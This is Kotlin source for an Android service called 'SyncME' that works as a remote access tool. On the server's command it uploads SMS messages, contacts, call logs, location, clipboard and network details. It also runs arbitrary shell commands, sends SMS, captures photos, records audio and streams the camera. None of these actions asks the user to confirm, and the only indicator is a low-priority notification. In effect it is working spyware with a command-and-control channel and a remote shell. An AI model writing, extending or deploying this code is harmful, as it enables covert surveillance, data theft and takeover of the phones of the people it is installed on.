package com.syncme.app

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.hardware.camera2.*
import android.location.*
import android.media.MediaRecorder
import android.net.Uri
import android.os.*
import android.provider.*
import android.telephony.TelephonyManager
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class SyncMEService : Service() {

    companion object {
        const val CH_ID   = "syncme"
        const val NID     = 1001
        var running       = false
    }

    private var SERVER    = ""
    private var TOKEN     = ""
    private var NAME      = Build.MODEL
    private var DEVICE_ID = "android-${Build.SERIAL.take(8)}"
    private val POLL      = 5000L

    private val http = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var lastLocation: Location? = null
    private var lastClip = ""

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        mkChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        SERVER    = intent?.getStringExtra("server") ?: SERVER
        TOKEN     = intent?.getStringExtra("token")  ?: TOKEN
        NAME      = intent?.getStringExtra("name")   ?: NAME
        DEVICE_ID = "android-${Build.SERIAL.take(8)}"
        startForeground(NID, notif("Connected to $SERVER"))
        running = true
        scope.launch { register() }
        scope.launch { heartbeat() }
        scope.launch { stats() }
        scope.launch { clipboard() }
        scope.launch { sms() }
        scope.launch { shell() }
        scope.launch { notifs() }
        scope.launch { gps() }
        scope.launch { contacts() }
        scope.launch { calllog() }
        scope.launch { camera() }
        scope.launch { mic() }
        scope.launch { control() }
        scope.launch { stream() }
        return START_STICKY
    }

    override fun onDestroy() { super.onDestroy(); running = false; scope.cancel() }
    override fun onBind(i: Intent?) = null

    // ── HTTP ──────────────────────────────────────────────────────────────────

    private fun post(path: String, body: JSONObject): JSONObject? = try {
        val r = Request.Builder().url("$SERVER$path")
            .addHeader("X-Auth-Token", TOKEN)
            .post(body.toString().toRequestBody("application/json".toMediaType())).build()
        http.newCall(r).execute().use { if (it.isSuccessful) JSONObject(it.body?.string() ?: "{}") else null }
    } catch (e: Exception) { log("POST $path: ${e.message}"); null }

    private fun get(path: String): String? = try {
        val r = Request.Builder().url("$SERVER$path").addHeader("X-Auth-Token", TOKEN).get().build()
        http.newCall(r).execute().use { if (it.isSuccessful) it.body?.string() else null }
    } catch (e: Exception) { log("GET $path: ${e.message}"); null }

    private fun postBytes(path: String, bytes: ByteArray, ct: String, extras: Map<String,String> = emptyMap()): JSONObject? = try {
        val partName = when { ct.contains("jpeg") -> "photo"; ct.contains("audio") -> "recording"; ct.contains("png") -> "screenshot"; else -> "file" }
        val fileName = when { ct.contains("jpeg") -> "photo.jpg"; ct.contains("audio") -> "rec.m4a"; else -> "file.bin" }
        val body = MultipartBody.Builder().setType(MultipartBody.FORM).apply {
            addFormDataPart(partName, fileName, bytes.toRequestBody(ct.toMediaType()))
            extras.forEach { (k,v) -> addFormDataPart(k,v) }
        }.build()
        val r = Request.Builder().url("$SERVER$path").addHeader("X-Auth-Token", TOKEN).post(body).build()
        http.newCall(r).execute().use { if (it.isSuccessful) JSONObject(it.body?.string() ?: "{}") else null }
    } catch (e: Exception) { log("POST bytes $path: ${e.message}"); null }

    private fun log(m: String) = android.util.Log.d("SyncME", m)

    // ── Register ──────────────────────────────────────────────────────────────

    private suspend fun register() {
        post("/api/register", JSONObject().apply {
            put("device_id", DEVICE_ID); put("name", NAME); put("type", "android")
            put("os", "Android ${Build.VERSION.RELEASE} / ${Build.MODEL}")
            put("capabilities", JSONArray(listOf("gps","sms","camera","mic","clipboard",
                "stats","contacts","calllog","shell","control","stream","notifications")))
        })?.let { log("Registered: $it") }
    }

    // ── Heartbeat ─────────────────────────────────────────────────────────────

    private suspend fun heartbeat() {
        while (running) {
            try {
                val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
                post("/api/heartbeat", JSONObject().apply {
                    put("device_id", DEVICE_ID)
                    put("quick_stats", JSONObject().apply {
                        put("battery_pct",    bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY))
                        put("battery_status", if (bm.isCharging) "Charging" else "Discharging")
                        put("plugged",        if (bm.isCharging) "AC" else "UNPLUGGED")
                    })
                })
            } catch (e: Exception) { log("heartbeat: ${e.message}") }
            delay(20_000)
        }
    }

    // ── Stats ─────────────────────────────────────────────────────────────────

    @SuppressLint("HardwareIds")
    private suspend fun stats() {
        while (running) {
            try {
                val bm  = getSystemService(BATTERY_SERVICE) as BatteryManager
                val mi  = ActivityManager.MemoryInfo()
                (getSystemService(ACTIVITY_SERVICE) as ActivityManager).getMemoryInfo(mi)
                val st  = StatFs(filesDir.path)
                val wm  = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                val wi  = wm.connectionInfo
                val ip  = wi?.ipAddress?.let { "%d.%d.%d.%d".format(it and 0xff, it shr 8 and 0xff, it shr 16 and 0xff, it shr 24 and 0xff) } ?: ""

                post("/api/android/stats", JSONObject().apply {
                    put("device_id",     DEVICE_ID)
                    put("battery_pct",   bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY))
                    put("battery_status",if (bm.isCharging) "Charging" else "Discharging")
                    put("mem_total_mb",  mi.totalMem / 1048576)
                    put("mem_avail_mb",  mi.availMem / 1048576)
                    put("mem_used_pct",  ((mi.totalMem - mi.availMem) * 100.0 / mi.totalMem).toInt())
                    put("storage_total_mb", st.totalBytes / 1048576)
                    put("storage_avail_mb", st.availableBytes / 1048576)
                    put("android_version",  Build.VERSION.RELEASE)
                    put("device_model",     Build.MODEL)
                    put("device_brand",     Build.BRAND)
                    put("android_sdk",      Build.VERSION.SDK_INT.toString())
                    put("uptime_hours",     (SystemClock.elapsedRealtime() / 3600000.0).toFloat())
                    put("cpu_cores",        Runtime.getRuntime().availableProcessors())
                    put("wifi_ssid",        wi?.ssid?.removePrefix("\"")?.removeSuffix("\"") ?: "")
                    put("wifi_rssi",        wi?.rssi ?: 0)
                    put("wifi_ip",          ip)
                    put("wifi_link_speed",  wi?.linkSpeed ?: 0)
                    (getSystemService(TELEPHONY_SERVICE) as? TelephonyManager)?.let {
                        put("network_operator", it.networkOperatorName)
                    }
                })
                log("[STATS] posted")
            } catch (e: Exception) { log("[STATS] ${e.message}") }
            delay(30_000)
        }
    }

    // ── Clipboard ─────────────────────────────────────────────────────────────

    private suspend fun clipboard() {
        val cm = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
        while (running) {
            try {
                val cur = cm.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
                if (cur.isNotEmpty() && cur != lastClip) {
                    lastClip = cur
                    post("/api/clipboard", JSONObject().apply { put("content", cur); put("source", NAME) })
                    log("[CLIP] → ${cur.take(60)}")
                }
                val remote = get("/api/clipboard")?.let { JSONObject(it) }
                if (remote != null && remote.optString("source") != NAME) {
                    val content = remote.optString("content")
                    if (content.isNotEmpty() && content != lastClip) {
                        lastClip = content
                        Handler(Looper.getMainLooper()).post {
                            cm.setPrimaryClip(ClipData.newPlainText("SyncME", content))
                        }
                        log("[CLIP] ← ${content.take(60)}")
                    }
                }
            } catch (e: Exception) { log("[CLIP] ${e.message}") }
            delay(POLL)
        }
    }

    // ── SMS ───────────────────────────────────────────────────────────────────

    private suspend fun sms() {
        while (running) {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                    val msgs = JSONArray()
                    contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC LIMIT 50")?.use { c ->
                        val iAddr = c.getColumnIndex(Telephony.Sms.ADDRESS)
                        val iBody = c.getColumnIndex(Telephony.Sms.BODY)
                        val iDate = c.getColumnIndex(Telephony.Sms.DATE)
                        val iType = c.getColumnIndex(Telephony.Sms.TYPE)
                        val iId   = c.getColumnIndex(Telephony.Sms._ID)
                        while (c.moveToNext()) msgs.put(JSONObject().apply {
                            put("number",    c.getString(iAddr) ?: "")
                            put("body",      c.getString(iBody) ?: "")
                            put("received",  c.getLong(iDate).toString())
                            put("type",      if (c.getInt(iType) == Telephony.Sms.MESSAGE_TYPE_SENT) "sent" else "inbox")
                            put("thread_id", c.getLong(iId).toString())
                        })
                    }
                    if (msgs.length() > 0) post("/api/sms/inbox", JSONObject().apply { put("device_id", DEVICE_ID); put("messages", msgs) })
                }
                val pending = get("/api/sms/poll?device_id=$DEVICE_ID")?.let { JSONArray(it) }
                if (pending != null && ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                    for (i in 0 until pending.length()) {
                        val s = pending.getJSONObject(i)
                        val to = s.optString("to"); val body = s.optString("body")
                        if (to.isNotEmpty() && body.isNotEmpty()) {
                            runCatching {
                                val sm = android.telephony.SmsManager.getDefault()
                                sm.sendMultipartTextMessage(to, null, sm.divideMessage(body), null, null)
                            }
                        }
                    }
                }
            } catch (e: Exception) { log("[SMS] ${e.message}") }
            delay(15_000)
        }
    }

    // ── Shell ─────────────────────────────────────────────────────────────────

    private suspend fun shell() {
        while (running) {
            try {
                val cmds = get("/api/shell/poll?device_id=$DEVICE_ID")?.let { JSONArray(it) }
                if (cmds != null) for (i in 0 until cmds.length()) {
                    val c = cmds.getJSONObject(i)
                    val rid = c.optString("id"); val cmd = c.optString("command")
                    runCatching {
                        val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
                        val out = p.inputStream.bufferedReader().readText()
                        val err = p.errorStream.bufferedReader().readText()
                        val exit = withTimeoutOrNull(30_000) { p.waitFor() } ?: -1
                        post("/api/shell/result", JSONObject().apply {
                            put("request_id", rid); put("output", out); put("error", err); put("exit_code", exit); put("device", NAME)
                        })
                    }.onFailure { e ->
                        post("/api/shell/result", JSONObject().apply {
                            put("request_id", rid); put("output",""); put("error", e.message ?: "Error"); put("exit_code",-1); put("device",NAME)
                        })
                    }
                }
            } catch (e: Exception) { log("[SHELL] ${e.message}") }
            delay(POLL)
        }
    }

    // ── Notifications ─────────────────────────────────────────────────────────

    private suspend fun notifs() {
        val seen = mutableSetOf<String>()
        while (running) {
            try {
                val ns = get("/api/notifications")?.let { JSONArray(it) }
                if (ns != null) for (i in 0 until ns.length()) {
                    val n = ns.getJSONObject(i); val id = n.optString("id")
                    if (id !in seen && n.optString("source") != NAME) {
                        seen.add(id)
                        showNotif(n.optString("title"), n.optString("body"), n.optString("app"))
                    }
                }
            } catch (e: Exception) { log("[NOTIF] ${e.message}") }
            delay(POLL)
        }
    }

    // ── GPS ───────────────────────────────────────────────────────────────────

    private suspend fun gps() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        Handler(Looper.getMainLooper()).post {
            runCatching {
                lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10_000L, 5f,
                    object : LocationListener { override fun onLocationChanged(l: Location) { lastLocation = l } })
            }
        }
        while (running) {
            try {
                val triggers = get("/api/gps/poll?device_id=$DEVICE_ID")?.let { JSONArray(it) }
                if (triggers != null && triggers.length() > 0) pushLocation(lm, "triggered")
                pushLocation(lm, "continuous")
            } catch (e: Exception) { log("[GPS] ${e.message}") }
            delay(30_000)
        }
    }

    @SuppressLint("MissingPermission")
    private fun pushLocation(lm: LocationManager, mode: String) {
        val loc = lastLocation
            ?: lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) ?: return
        scope.launch {
            post("/api/gps/update", JSONObject().apply {
                put("device_id", DEVICE_ID); put("latitude", loc.latitude); put("longitude", loc.longitude)
                put("accuracy", loc.accuracy); put("altitude", loc.altitude); put("speed", loc.speed)
                put("bearing", loc.bearing); put("provider", loc.provider ?: ""); put("mode", mode)
                put("timestamp", loc.time / 1000.0)
            })
            log("[GPS] lat=${loc.latitude} lon=${loc.longitude} acc=${loc.accuracy}m")
        }
    }

    // ── Contacts ──────────────────────────────────────────────────────────────

    private suspend fun contacts() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return
        while (running) {
            try {
                val arr = JSONArray()
                contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER),
                    null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")?.use { c ->
                    val iN = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val iP = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    while (c.moveToNext()) arr.put(JSONObject().apply {
                        put("name", c.getString(iN) ?: ""); put("number", c.getString(iP) ?: "")
                    })
                }
                if (arr.length() > 0) {
                    post("/api/contacts/sync", JSONObject().apply { put("device_id", DEVICE_ID); put("contacts", arr) })
                    log("[CONTACTS] synced ${arr.length()}")
                }
            } catch (e: Exception) { log("[CONTACTS] ${e.message}") }
            delay(7_200_000)
        }
    }

    // ── Call Log ──────────────────────────────────────────────────────────────

    private suspend fun calllog() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return
        while (running) {
            try {
                val arr = JSONArray()
                contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} DESC LIMIT 100")?.use { c ->
                    val iN  = c.getColumnIndex(CallLog.Calls.NUMBER)
                    val iNm = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    val iT  = c.getColumnIndex(CallLog.Calls.TYPE)
                    val iD  = c.getColumnIndex(CallLog.Calls.DATE)
                    val iDr = c.getColumnIndex(CallLog.Calls.DURATION)
                    while (c.moveToNext()) {
                        val type = when(c.getInt(iT)) { CallLog.Calls.INCOMING_TYPE->"incoming"; CallLog.Calls.OUTGOING_TYPE->"outgoing"; CallLog.Calls.MISSED_TYPE->"missed"; else->"unknown" }
                        arr.put(JSONObject().apply {
                            put("number", c.getString(iN) ?: ""); put("name", c.getString(iNm) ?: "")
                            put("type", type); put("date", java.util.Date(c.getLong(iD)).toString()); put("duration", c.getLong(iDr))
                        })
                    }
                }
                if (arr.length() > 0) {
                    post("/api/calllog/sync", JSONObject().apply { put("device_id", DEVICE_ID); put("calls", arr) })
                    log("[CALLLOG] synced ${arr.length()}")
                }
            } catch (e: Exception) { log("[CALLLOG] ${e.message}") }
            delay(120_000)
        }
    }

    // ── Camera ────────────────────────────────────────────────────────────────

    private suspend fun camera() {
        while (running) {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                    val cmds = get("/api/camera/poll?device_id=$DEVICE_ID")?.let { JSONArray(it) }
                    if (cmds != null) for (i in 0 until cmds.length()) {
                        val c = cmds.getJSONObject(i); val rid = c.optString("id"); val cam = c.optInt("camera", 0)
                        val bytes = capturePhoto(cam)
                        if (bytes != null) postBytes("/api/camera/upload", bytes, "image/jpeg", mapOf("device_id" to DEVICE_ID, "request_id" to rid))
                    }
                }
            } catch (e: Exception) { log("[CAM] ${e.message}") }
            delay(POLL)
        }
    }

    private suspend fun capturePhoto(camIdx: Int): ByteArray? =
        withTimeoutOrNull(10_000) {
            suspendCancellableCoroutine { cont ->
                try {
                    val cm  = getSystemService(CAMERA_SERVICE) as CameraManager
                    val cid = cm.cameraIdList.getOrElse(camIdx) { cm.cameraIdList[0] }
                    val h   = Handler(Looper.getMainLooper())
                    cm.openCamera(cid, object : CameraDevice.StateCallback() {
                        override fun onOpened(cam: CameraDevice) {
                            try {
                                val reader = android.media.ImageReader.newInstance(1280, 720, android.graphics.ImageFormat.JPEG, 1)
                                val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply { addTarget(reader.surface) }
                                cam.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(s: CameraCaptureSession) {
                                        s.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {
                                            override fun onCaptureCompleted(s: CameraCaptureSession, r: CaptureRequest, result: TotalCaptureResult) {
                                                reader.setOnImageAvailableListener({ rd ->
                                                    val img = rd.acquireLatestImage()
                                                    val buf = img.planes[0].buffer
                                                    val b = ByteArray(buf.remaining()); buf.get(b)
                                                    img.close(); cam.close()
                                                    cont.resume(b) {}
                                                }, h)
                                            }
                                        }, h)
                                    }
                                    override fun onConfigureFailed(s: CameraCaptureSession) { cam.close(); cont.resume(null) {} }
                                }, h)
                            } catch (e: Exception) { cam.close(); cont.resume(null) {} }
                        }
                        override fun onDisconnected(c: CameraDevice) { c.close(); cont.resume(null) {} }
                        override fun onError(c: CameraDevice, e: Int) { c.close(); cont.resume(null) {} }
                    }, h)
                } catch (e: Exception) { cont.resume(null) {} }
            }
        }

    // ── Mic ───────────────────────────────────────────────────────────────────

    private suspend fun mic() {
        while (running) {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                    val cmds = get("/api/mic/poll?device_id=$DEVICE_ID")?.let { JSONArray(it) }
                    if (cmds != null) for (i in 0 until cmds.length()) {
                        val c = cmds.getJSONObject(i); val rid = c.optString("id"); val dur = c.optInt("duration", 10)
                        val f = File(cacheDir, "sb_rec_$rid.m4a")
                        val rec = MediaRecorder(applicationContext).apply {
                            setAudioSource(MediaRecorder.AudioSource.MIC)
                            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                            setOutputFile(f.absolutePath)
                            prepare(); start()
                        }
                        delay(dur * 1000L)
                        runCatching { rec.stop() }; rec.release()
                        if (f.exists() && f.length() > 0) {
                            postBytes("/api/mic/upload", f.readBytes(), "audio/mp4", mapOf("device_id" to DEVICE_ID, "request_id" to rid))
                            f.delete(); log("[MIC] uploaded")
                        }
                    }
                }
            } catch (e: Exception) { log("[MIC] ${e.message}") }
            delay(POLL)
        }
    }

    // ── Control ───────────────────────────────────────────────────────────────

    private suspend fun control() {
        while (running) {
            try {
                val cmds = get("/api/control/poll?device_id=$DEVICE_ID")?.let { JSONArray(it) }
                if (cmds != null) for (i in 0 until cmds.length()) {
                    val c = cmds.getJSONObject(i); val rid = c.optString("id"); val cmd = c.optString("command")
                    var ok = false; var out = ""; var err = ""
                    runCatching {
                        when (cmd) {
                            "torch_on","torch_off" -> {
                                val cm = getSystemService(CAMERA_SERVICE) as CameraManager
                                val id = cm.cameraIdList.firstOrNull {
                                    cm.getCameraCharacteristics(it).get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
                                }
                                if (id != null) { cm.setTorchMode(id, cmd == "torch_on"); ok = true; out = "Done" }
                                else err = "No flash"
                            }
                            "vibrate" -> {
                                val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
                                val d = c.optLong("duration", 500)
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                                    v.vibrate(VibrationEffect.createOneShot(d, VibrationEffect.DEFAULT_AMPLITUDE))
                                else @Suppress("DEPRECATION") v.vibrate(d)
                                ok = true; out = "Vibrated ${d}ms"
                            }
                            "toast" -> {
                                val txt = c.optString("text")
                                Handler(Looper.getMainLooper()).post {
                                    Toast.makeText(applicationContext, txt, Toast.LENGTH_LONG).show()
                                }
                                ok = true; out = "Shown"
                            }
                            "wifi_on"  -> { Runtime.getRuntime().exec(arrayOf("svc","wifi","enable"));  ok = true }
                            "wifi_off" -> { Runtime.getRuntime().exec(arrayOf("svc","wifi","disable")); ok = true }
                            "open_url" -> {
                                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(c.optString("url"))).apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK })
                                ok = true
                            }
                            else -> err = "Unknown: $cmd"
                        }
                    }.onFailure { e -> err = e.message ?: "Error" }
                    post("/api/control/result", JSONObject().apply {
                        put("request_id", rid); put("output", out); put("error", err); put("success", ok); put("device", NAME)
                    })
                }
            } catch (e: Exception) { log("[CTRL] ${e.message}") }
            delay(POLL)
        }
    }

    // ── Stream ────────────────────────────────────────────────────────────────

    private suspend fun stream() {
        var streaming = false; var lingerUntil = 0L; var cam = 0; var fps = 4
        while (running) {
            try {
                val s = get("/api/stream/$DEVICE_ID/status")?.let { JSONObject(it) }
                val active = s?.optBoolean("active", false) ?: false
                val viewers = s?.optInt("viewers", 0) ?: 0
                cam = s?.optInt("camera", cam) ?: cam
                fps = s?.optInt("fps", fps) ?: fps

                if (active && viewers > 0) { streaming = true; lingerUntil = System.currentTimeMillis() + 10_000 }
                else if (streaming && System.currentTimeMillis() < lingerUntil) { /* linger */ }
                else if (streaming) { streaming = false; delay(4000); continue }

                if (streaming && ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                    val t0 = System.currentTimeMillis()
                    val b = capturePhoto(cam)
                    if (b != null) {
                        runCatching {
                            val r = Request.Builder().url("$SERVER/api/stream/$DEVICE_ID/push")
                                .addHeader("X-Auth-Token", TOKEN).addHeader("Content-Type","image/jpeg")
                                .post(b.toRequestBody("image/jpeg".toMediaType())).build()
                            http.newCall(r).execute().use { resp ->
                                val v = resp.body?.string()?.let { JSONObject(it).optInt("viewers",0) } ?: 0
                                if (v > 0) lingerUntil = System.currentTimeMillis() + 10_000
                            }
                        }
                        val sleep = (1000L / fps) - (System.currentTimeMillis() - t0)
                        if (sleep > 0) delay(sleep)
                    } else delay(1000)
                } else delay(5000)
            } catch (e: Exception) { log("[STREAM] ${e.message}"); streaming = false; delay(5000) }
        }
    }

    // ── Notification helpers ──────────────────────────────────────────────────

    private fun mkChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(NotificationChannel(CH_ID, "SyncME", NotificationManager.IMPORTANCE_LOW).apply { setShowBadge(false) })
        }
    }

    private fun notif(status: String) = NotificationCompat.Builder(this, CH_ID)
        .setSmallIcon(android.R.drawable.ic_dialog_info)
        .setContentTitle("⚡ SyncME").setContentText(status)
        .setOngoing(true).setPriority(NotificationCompat.PRIORITY_LOW).build()

    private fun showNotif(title: String, body: String, app: String) {
        val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        nm.notify(System.currentTimeMillis().toInt(), NotificationCompat.Builder(this, CH_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("${if(app.isNotEmpty()) "[$app] " else ""}$title")
            .setContentText(body).setAutoCancel(true).build())
    }
}
